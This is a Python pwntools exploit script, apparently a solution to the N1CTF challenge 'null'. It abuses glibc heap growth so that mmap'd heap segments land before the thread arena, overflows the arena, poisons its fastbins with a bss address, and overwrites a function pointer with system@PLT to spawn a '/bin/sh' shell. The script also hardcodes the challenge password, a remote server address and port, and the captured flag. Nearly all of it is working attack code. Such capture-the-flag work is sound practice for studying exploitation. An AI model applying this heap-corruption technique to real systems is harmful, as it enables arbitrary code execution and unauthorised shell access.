# The goal is to trigger grow_heap and new_heap in sysmalloc multiple times 
# so that further heap semgnets will be mmap'd BEFORE the thread_arena
# in order to overflow it, perform a fastbin attack and finally return an address 
# close to the function pointer in the bss in order to overwrite it with system@PLT.

# The function pointer is called as func_ptr(heap, size). Since we have control over
# the content of the heap chunk, func_ptr will turn into system(heap) => system('/bin/sh').

# --==[[ Refs
# [0] https://github.com/str8outtaheap/heapwn/blob/master/malloc/sysmalloc.c
# [1] https://github.com/str8outtaheap/heapwn/blob/master/malloc/grow_heap.c
# [2] https://github.com/str8outtaheap/heapwn/blob/master/malloc/new_heap.c

from pwn import *
from time import sleep

def alloc(size, blocks, data, mode):
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', str(size))
    r.sendlineafter('blocks: ', str(blocks))
    r.sendlineafter('(0/1): ', str(mode))

    if mode == 0:
    	return

    r.sendafter('Input: ', data.ljust(size, 'A'))
    return

def overflow():
    r.sendlineafter('Action: ', '1')
    r.sendlineafter('Size: ', str(944))
    r.sendlineafter('blocks: ', str(0))
    r.sendlineafter('(0/1): ', str(1))

    r.send('Z' * 600)
    r.send('Z' * 328
    	    + p64(0) * 8
    	    + p64(0x3ffd000) * 2
    	    + p64(0x300000000)
    	    # Spray the thread_arena's fastbins with our victim chunk
    	    + p64(bss) * 8)

    return

passwd = "i'm ready for challenge"
bss    = 0x60201d
system = 0x400978

def pwn():

    r.sendlineafter('password: \n', passwd)

    alloc(0xc8, 3, '', 0)

    for i in xrange(10):
    	alloc(16300, 999, '', 0)
    
    cnt = 0
    while(1):

    	if cnt == 0x920:
    		break
    	
    	alloc(16300, 0, '', 0)

    	cnt += 1

    # At this point, there is an unsorted chunk chunk 0x3e0 right before the thread_arena
    # At the same time, there is a chunk of equal size in the smallbin list. Because of
    # of malloc's order of checking, it will check the smallbin list first and then
    # the unsorted bin. That being said, we need two allocations in order to get back
    # the chunk before thread_arena.
    sleep(0.5)
    
    alloc(944, 0, '', 0)
   
    overflow()
    
    # At this point the thread_arena's fastbin offsets are filled 
    # with the bss pointer whose size is 0x7f. If we request a chunk
    # of size 0x68, we will get it back and finally overwrite the function
    # pointer with system's PLT address.
    buf  = '/bin/sh\x00'
    buf += 'kek'
    buf += p64(system)
    buf  = buf.ljust(0x68, 'A')
    alloc(0x68, 0, buf, 1)

	#N1CTF{a_singie_spark_burns_the_arena}
    r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('47.75.57.242', 5000)
        pwn()
    else:
        r = process('./null')
        pause()
        pwn()
